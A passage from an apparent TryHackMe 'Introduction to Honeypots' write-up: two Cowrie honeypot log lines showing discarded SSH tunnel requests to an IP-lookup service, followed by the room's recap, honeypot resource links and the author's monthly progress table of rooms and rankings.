2021-03-12T10:15:41.038795Z [SSHChannel cowrie-discarded-direct-tcpip (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,7860,0.0.0.0] discarded direct-tcp forward request 0 to ip-api.com:80 with data b'GET /json HTTP/1.1\r\nHost: ip-api.com\r\nConnection: keep-alive\r\nAccept-Encoding: gzip,deflate\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36\r\n\r\n'
2021-03-12T10:20:42.030075Z [SSHChannel cowrie-discarded-direct-tcpip (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,7929,0.0.0.0] discarded direct-tcp forward request 0 to ip-api.com:80 with data b'GET /json HTTP/1.1\r\nHost: ip-api.com\r\nConnection: keep-alive\r\nAccept-Encoding: gzip,deflate\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0\r\n\r\n'
```

<br>
<br>
<h2 align="center">Task 8 . Recap and Extra Resources</h2>
<h3 align="center">Recap</h3>
<p>I hope this room has demonstrated how interesting honeypots can be and how the data that we can collect from them can be used to gain insight into the operations of botnets and other malicious actors.</p>

<h3 align="center">Extra Resources</h3>
<p>I've included some extra resources to assist in learning more about honeypots below:

- Awesome Honeypots - A curated list of honeypots<br>
- Cowrie - The  SSH honeypot used in the demo<br>
- Sending Cowrie Output to ELK - A good example of how to implement live log monitoring<br>

I would also recommend that you deploy a honeypot yourself as it's a great way to learn. Deploying a honeypot is also a great way to understand how to work with cloud providers since external honeypots are best when deployed to the cloud. ﻿Deploying and managing multiple honeypots is also an interesting challenge and a good way to gain practical experience with tools like Ansible.</p>

<p><em>Answer the question below</em></p>

<p>8.1. Read and understand the above<br>
<code>No answer needed</code></p>

<br>
<br>

<h1 align="center">Completed</h1>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/9478cbde-6684-40fc-a37a-695d47f782d5"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/5e053bc6-3a7c-4371-a91c-48d61c7e1b6a"></p>

<h1 align="center">My TryHackMe Journey ・ 2025, September</h1>

<div align="center"><h6>

| Date   | Room                                  |Streak   |All Time<br>Global|All Time<br>Brazil|Monthly<br>Global|Monthly<br>Brazil|Points|Rooms<br>Completed|Badges|
|:------:|:--------------------------------------|--------:|------------:|------------:|------------:|------------:|------------:|------------:|------------:|
|25      |Medium 🔗 - <strong>Introduction to Honeypots</strong>| 507 | 109ᵗʰ|  4ᵗʰ     |     303ʳᵈ   |     5ᵗʰ     | 127,110  |   976    |   76     |
|25      |Medium 🔗 - Windows x64 Assembly       | 507    |     109ᵗʰ    |      4ᵗʰ     |     303ʳᵈ   |     5ᵗʰ     | 127,110  |   975     |   76     | 
|25      |Easy 🔗 - Network Secuity Essentials   | 507    |     112ⁿᵈ    |      4ᵗʰ     |     302ⁿᵈ   |     5ᵗʰ     | 126,990  |   974     |   76     | 
|24      |Medium 🔗 - Linux Threat Detection 1   | 506    |     110ᵗʰ    |      4ᵗʰ     |     330ᵗʰ   |     5ᵗʰ     | 126,894  |   973     |   76     | 
|24      |Hard 🚩 - Iron Corp                    | 506    |     111ˢᵗ    |      4ᵗʰ     |     363ʳᵈ   |     5ᵗʰ     | 126,768  |   972     |   76     |    
|23      |Medium 🔗 - Intro to Credential Harvesting|505  |     109ᵗʰ    |      4ᵗʰ     |     346ᵗʰ   |     5ᵗʰ     | 126,768  |   971     |   76     |    
|22      |                                        | 504   |              |      4ᵗʰ     |             |             |          |           |   76     |    
|21      |                                        | 503   |              |      4ᵗʰ     |             |             |          |           |   76     |    
|20      |                                        | 502   |              |      4ᵗʰ     |             |             |          |           |   76     |    
|19      |                                        | 501   |              |      4ᵗʰ     |             |             |          |           |   76     |        
|18      |Easy 🔗 - Detecting Web DDos           | 500    |     106ᵗʰ    |      4ᵗʰ     |     312ⁿᵈ   |     4ᵗʰ    | 126,674  |    970    |    76     |
|17      |Medium 🔗 - DLL Hijacking              | 499    |     106ᵗʰ    |      4ᵗʰ     |     348ᵗʰ   |     7ᵗʰ    | 126,554  |    969    |    75     |
|17      |Medium 🔗 - The Docker Rodeo           | 499    |     106ᵗʰ    |      4ᵗʰ     |     346ᵗʰ   |     7ᵗʰ    | 126,546  |    968    |    75     |
|17      |Easy 🔗 - Linux Logging for SOC        | 499    |     106ᵗʰ    |      4ᵗʰ     |     345ᵗʰ   |     7ᵗʰ    | 126,538  |    967    |    74     |
|16      |Hard 🚩 - TryHack3M: TriCipher Summit  | 498    |     107ᵗʰ    |      4ᵗʰ     |     364ᵗʰ    |     7ᵗʰ    | 126,420  |    966    |    74     |
|16      |Easy 🔗 - Chaining Vulnerabilities     | 498    |     108ᵗʰ    |      5ᵗʰ     |     365ᵗʰ    |     7ᵗʰ    | 126,420  |    965    |    74     |
|15      |Medium 🔗 - AppSec IR                  | 497    |     108ᵗʰ    |      5ᵗʰ     |     352ⁿᵈ    |     7ᵗʰ    | 126,404  |    964    |    74     |
|14      |Hard 🚩 - Misguided Ghosts, in progress| 496    |     108ᵗʰ    |      5ᵗʰ     |     389ᵗʰ    |     6ᵗʰ    | 126,300  |    963    |    74     |
|14      |Hard 🚩 - VulnNet: Endgame             | 496    |     108ᵗʰ    |      5ᵗʰ     |     394ᵗʰ    |     6ᵗʰ    | 126,270  |    963    |    74     |
|13      |Hard 🚩 - Royal Router                 | 495    |     107ᵗʰ    |      5ᵗʰ     |     388ᵗʰ    |     6ᵗʰ    | 126,160  |    962    |    74     |
|13      |Medium 🚩 - Void Execution             | 495    |     107ᵗʰ    |      5ᵗʰ     |     383ʳᵈ    |     6ᵗʰ    | 126,120  |    961    |    73     |
|12      |Easy 🚩 - Invite Only                  | 494    |     110ᵗʰ    |      5ᵗʰ     |     352ⁿᵈ    |     6ᵗʰ    | 126,056  |    960    |    73     |
|12      |Medium 🚩 - Devie                      | 494    |     110ᵗʰ    |      5ᵗʰ     |     607ᵗʰ    |     9ᵗʰ    | 125,606  |    959    |    73     |
|11      |Medium 🚩 - Backtrack, in progress     | 493    |     110ᵗʰ    |      5ᵗʰ     |     629ᵗʰ    |     9ᵗʰ    | 125,516  |    958    |    73     |
|11      |Easy 🔗 - Detecting Web Attacks        | 493    |     110ᵗʰ    |      5ᵗʰ     |     629ᵗʰ    |     9ᵗʰ    | 125,516  |    958    |    73     |
|10      |Easy 🔗 - Attacking ICS Plant #1       | 492    |     110ᵗʰ    |      5ᵗʰ     |     675ᵗʰ    |     9ᵗʰ    | 125,428  |    957    |    73     |
|10      |Easy 🔗 - SOC Role in Blue Team        | 492    |     110ᵗʰ    |      5ᵗʰ     |     664ᵗʰ    |     9ᵗʰ    | 125,292  |    956    |    73     |
|9       |Hard 🚩 - Python Playground            | 491    |     111ˢᵗ    |      5ᵗʰ     |     693ʳᵈ    |     9ᵗʰ    | 125,236  |    955    |    73     |
|9       |Hard 🚩 - Borderlands                  | 491    |     111ˢᵗ    |      5ᵗʰ     |     713ʳᵈ    |    10ᵗʰ    | 125,146  |    954    |    73     |
|9       |Medium 🚩 - Forgotten Implant          | 491    |     112ⁿᵈ    |      5ᵗʰ     |     660ᵗʰ    |    10ᵗʰ    | 125,016  |    953    |    73     |
|8       |Easy 🔗 - Web Enumeration              | 490    |     112ⁿᵈ    |      5ᵗʰ     |     663ʳᵈ    |    10ᵗʰ    | 124,986  |    952    |    73     |
|8       |Easy 🔗 - iOS: Forensics               | 490    |     113ʳᵈ    |      5ᵗʰ     |     548ᵗʰ    |     9ᵗʰ    | 124,850  |    951    |    73     |
|7       |Medium 🚩 - VulnNet: Active            | 489    |     114ᵗʰ    |      5ᵗʰ     |     542ⁿᵈ    |     9ᵗʰ    | 124,746  |    950    |    73     |
|7       |Medium 🚩 - pyLon                      | 489    |     114ᵗʰ    |      5ᵗʰ     |     535ᵗʰ    |     9ᵗʰ    | 124,716  |    949    |    73     |
|7       |Medium 🚩 - Pressed                    | 489    |     113ʳᵈ    |      5ᵗʰ     |     508ᵗʰ    |     9ᵗʰ    | 124,886  |    948    |    73     |
|6       |Easy 🚩 - Classic Passwd               | 488    |     114ᵗʰ    |      5ᵗʰ     |     683ʳᵈ    |    12ⁿᵈ    | 124,476  |    947    |    73     |
|6       |Medium 🚩 - toc2                       | 488    |     114ᵗʰ    |      5ᵗʰ     |     695ᵗʰ    |    12ⁿᵈ    | 124,446  |    946    |    73     |
|6       |Hard 🚩 - Extract                      | 488    |     114ᵗʰ    |      5ᵗʰ     |     716ᵗʰ    |    13ʳᵈ    | 124,386  |    945    |    73     |
|6       |Medium 🚩 - Plotted-EMR                | 488    |     114ᵗʰ    |      5ᵗʰ     |     844ᵗʰ    |    12ⁿᵈ    | 124,326  |    944    |    73     |
|5       |Medium 🚩 - Inferno                    | 487    |     114ᵗʰ    |      5ᵗʰ     |     758ᵗʰ    |    12ⁿᵈ    | 124,236  |    943    |    73     |
|5       |Easy 🔗 - Psycho Break                 | 487    |     115ᵗʰ    |      5ᵗʰ     |     724ᵗʰ    |    10ᵗʰ    | 124,152  |    942    |    73     |
|4       |Medium 🚩 - Cold VVars                 | 486    |     113ʳᵈ    |      5ᵗʰ     |     579ᵗʰ    |    10ᵗʰ    | 124,048  |    941    |    73     |
|4       |Medium 🔗 - IP and Domain Threat Intel | 486    |     113ʳᵈ    |	     5ᵗʰ    |     579ᵗʰ     |    10ᵗʰ    | 124,018  |   940     |    73     |
|3       |Easy 🔗 - Malware Classification       | 485    |     112ⁿᵈ    |      5ᵗʰ     |     714ᵗʰ    |    13ʳᵈ    | 123,882  |    939    |    73     |
|2       |Medium 🔗 - Session Forensics          | 484    |     111ˢᵗ    |      5ᵗʰ     |     706ᵗʰ    |    14ᵗʰ    | 123,786  |    938    |    73     |
|1       |Medium 🚩 - Voyage                     | 483    |     111ˢᵗ    |      5ᵗʰ     |     849ᵗʰ    |    15ᵗʰ    | 123,636  |    937    |    73     |

</h6></div><br>

<br>

<p align="center">Global All Time:   106ᵗʰ<br><img width="250px"  src="https://github.com/user-attachments/assets/fd99a885-3626-4f4c-9078-c4e772f217f1"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/96724426-c425-46cc-993b-db3284f03a88"><br><br>
                  Brazil All Time:     4ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/a470dbac-e484-41a2-82ae-747ad99b9037"><br>
                  Global monthly:    302ⁿᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/9a807860-b6c6-463a-8fde-e0f4e7447065"><br>
                  Brazil monthly:      5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/d5b4d6a6-3705-4e3d-95ce-d409a4b778b8"><br>

<h1 align="center">Thanks for coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>
